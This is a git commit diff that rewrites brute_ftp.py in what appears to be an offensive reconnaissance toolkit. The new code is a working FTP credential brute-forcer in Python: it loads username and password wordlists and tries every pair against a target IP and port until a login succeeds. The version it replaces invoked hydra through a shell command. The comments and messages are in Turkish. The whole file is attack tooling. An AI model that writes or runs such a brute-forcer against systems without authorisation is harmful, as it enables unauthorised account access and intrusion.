b822ceee4d6a6587f4e58ae09aea2a8257e6415a
İNTİKAM21 CYBER <167871296+Intikam21kurucu@users.noreply.github.com>
2024-12-27 22:25:17 +0300

    Update brute_ftp.py

--- modules/enumaration/brute_ftp.py
+++ modules/enumaration/brute_ftp.py
@@ -1,24 +1,49 @@
 #!/usr/bin/env python3
-import subprocess
 import sys
+from ftplib import FTP
 import reconf
 from reconf import *
 
-if len(sys.argv) != 3:
-    print("Usage: brute_ftp.py <ip address> <port>")
-    sys.exit(0)
+# Kullanıcı adı ve şifre listelerini dosyadan oku
+def load_list(file_path):
+    with open(file_path, "r") as file:
+        return [line.strip() for line in file.readlines()]
 
-ip_address = sys.argv[1].strip()
-port = sys.argv[2].strip()
+# FTP ile giriş yapmayı dene
+def ftp_brute_force(target_ip, target_port, usernames, passwords):
+    ftp = FTP()
+    ftp.set_debuglevel(0)  # Debug seviyesini kapat
 
-print("INFO: Performing hydra ftp scan against " + ip_address)
-HYDRA = f"hydra -L {reconf.usrlst} -P {reconf.pwdlst} -f -o {reconf.rsltpth}/{ip_address}_ftphydra.txt -u {ip_address} -s {port} ftp"
-try:
-    print(f"[+] Executing - {HYDRA}")
-    results = subprocess.check_output(HYDRA, shell=True)
-    resultarr = results.decode('utf-8').split("\n")
-    for result in resultarr:
-        if "login:" in result:
-            print("[*] Valid ftp credentials found: " + result)
-except:
-    print("INFO: No valid ftp credentials found")
+    # Kullanıcı adı ve şifre denemeleri
+    for username in usernames:
+        for password in passwords:
+            try:
+                print(f"[*] Deneniyor: {username} / {password}")
+                ftp.connect(target_ip, target_port)  # Bağlantı kur
+                ftp.login(username, password)  # Giriş yapmayı dene
+                print(f"[+] Başarıyla Bağlandı: {username} / {password}")
+                ftp.quit()  # Başarıyla bağlandıysa bağlantıyı kes
+                return  # Başarılı giriş sonrası çık
+            except Exception as e:
+                print(f"[-] Hatalı Şifre: {username} / {password}")
+                ftp.close()  # Bağlantıyı kapat, yeniden denemek için
+            except:
+                print("[-] Bir hata oluştu.")
+    print("[-] Hiçbir şifre çalışmadı.")
+
+# Ana fonksiyon çalıştır
+if __name__ == "__main__":
+    if len(sys.argv) != 3:
+        print("Kullanım: brute_ftp.py <Hedef_IP> <Port>")
+        sys.exit(0)
+
+    # Komut satırından IP ve port al
+    ip_address = sys.argv[1]
+    port = int(sys.argv[2])  # Portu int olarak al
+
+    # Kullanıcı adı ve şifre dosyalarını oku
+    usernames = load_list("modules/wordlists/usernames.txt")  # Kullanıcı adı listesi
+    passwords = load_list("modules/wordlists/ssh_passwd.txt")  # Şifre listesi
+
+    # FTP brute force saldırısını başlat
+    ftp_brute_force(ip_address, port, usernames, passwords)
